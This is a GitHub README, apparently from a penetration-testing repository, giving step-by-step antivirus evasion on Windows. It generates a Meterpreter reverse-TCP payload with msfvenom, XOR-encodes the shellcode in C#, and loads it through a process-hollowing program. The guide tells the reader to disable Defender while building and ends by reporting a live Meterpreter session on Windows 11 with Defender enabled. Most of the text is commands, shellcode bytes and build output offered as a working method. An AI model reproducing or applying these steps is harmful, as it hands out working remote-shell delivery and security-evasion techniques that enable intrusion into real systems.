## Built and Tested with Visual Studio 2019
credit - [https://github.com/chvancooten/OSEP-Code-Snippets/tree/main](https://github.com/chvancooten/OSEP-Code-Snippets)

Generate metasploit payload
```python
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp -f csharp LHOST=192.168.0.247 LPORT=443 EXITFUNC=thread
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 511 bytes
Final size of csharp file: 2628 bytes
byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,
0xd2,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x0f,
0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
```

Open XOR-Encoder.cs in visual Studio and paste in the shellcode here

![image](https://github.com/deeexcee-io/AV-Stuff/assets/130473605/174b751e-b5c9-4d9d-bee1-846659544001)

Change the key to XOR Encode the shellcode if you wish
```python
byte[] encoded = new byte[buffer.Length];
            for (int i = 0; i < buffer.Length; i++)
            {
                encoded[i] = (byte)((uint)buffer[i] ^ 25678998); //KEY
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            int totalCount = encoded.Length;
            for (int count = 0; count < totalCount; count++)
```

Turn off Defender on your dev machine as it will flag the raw metasploit shellcode and wont run the exe

Set to `Release` and `x64` (Change where necessary)

![image](https://github.com/deeexcee-io/AV-Stuff/assets/130473605/e3990de2-72e0-4106-8345-59b7372cb381)

Click Build > Build Solution

Build should happen with no errors

```python
Build started...
1>------ Build started: Project: XOR-Shellcode-Encoder, Configuration: Release x64 ------
1>  XOR-Shellcode-Encoder -> C:\Users\gd\Desktop\Custom Exploits\repos\XOR-Shellcode-Encoder\XOR-Shellcode-Encoder\bin\x64\Release\XOR-Shellcode-Encoder.exe
========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
```

Navigate to the folder and run the .exe

You will get the XOR encoded shellcode

```python
PS C:\Users\gd\Desktop\Custom Exploits\repos\XOR-Shellcode-Encoder\XOR-Shellcode-Encoder\bin\x64\Release> .\XOR-Shellcode-Encoder.exe
XOR payload (key: 0xfa):
byte[] buf = new byte[511] {
0x6a, 0xde, 0x15, 0x72, 0x66, 0x7e, 0x5a, 0x96, 0x96, 0x96, 0xd7, 0xc7, 0xd7, 0xc6, 0xc4,
0xde, 0xa7, 0x44, 0xc7, 0xc0, 0xf3, 0xde, 0x1d, 0xc4, 0xf6, 0xde, 0x1d, 0xc4, 0x8e, 0xde,
0x1d, 0xc4, 0xb6, 0xde, 0x1d, 0xe4, 0xc6, 0xde, 0x99, 0x21, 0xdc, 0xdc, 0xdb, 0xa7, 0x5f,
0xde, 0xa7, 0x56, 0x3a, 0xaa, 0xf7, 0xea, 0x94, 0xba, 0xb6, 0xd7, 0x57, 0x5f, 0x9b, 0xd7,
0x97, 0x57, 0x74, 0x7b, 0xc4, 0xde, 0x1d, 0xc4, 0xb6, 0xd7, 0xc7, 0x1d, 0xd4, 0xaa, 0xde,
0x97, 0x46, 0xf0, 0x17, 0xee, 0x8e, 0x9d, 0x94, 0x99, 0x13, 0xe4, 0x96, 0x96, 0x96, 0x1d,
0x16, 0x1e, 0x96, 0x96, 0x96, 0xde, 0x13, 0x56, 0xe2, 0xf1, 0xde, 0x97, 0x46, 0xd2, 0x1d,
0xd6, 0xb6, 0x1d, 0xde, 0x8e, 0xdf, 0x97, 0x46, 0xc6, 0x75, 0xc0, 0xdb, 0xa7, 0x5f, 0xde,
0x69, 0x5f, 0xd7, 0x1d, 0xa2, 0x1e, 0xde, 0x97, 0x40, 0xde, 0xa7, 0x56, 0xd7, 0x57, 0x5f,
0x9b, 0x3a, 0xd7, 0x97, 0x57, 0xae, 0x76, 0xe3, 0x67, 0xda, 0x95, 0xda, 0xb2, 0x9e, 0xd3
```
Open `P-Hollow` in Visual Studio

Paste the XOR Encoded Shellcode in (You can turn on Defender now it wont be picked up) 

![image](https://github.com/deeexcee-io/AV-Stuff/assets/130473605/d8da75b5-2687-4ac8-a27a-25bd4f071332)

If you changed the XOR Key in the previous file, ensure you change it here aswell otherwise it wont decode 

![image](https://github.com/deeexcee-io/AV-Stuff/assets/130473605/fd36f91e-f5fc-4d00-89c0-0ed04b66f9ac)

Set to `Release` and `x64`

Now depending on what access you already have, execute the .exe and catch in Metasploit.

Here I am executing from a network share (impacket-smbserver) I configued

![image](https://github.com/deeexcee-io/AV-Stuff/assets/130473605/8602d6cc-a3d1-4ecf-8363-f0f281324f03)

Fully functioning meterpreter session on latest Windows 11 with Defender Enabled

![image](https://github.com/deeexcee-io/AV-Stuff/assets/130473605/2dcbf6d6-951e-4b09-83fa-3d9092a87546)












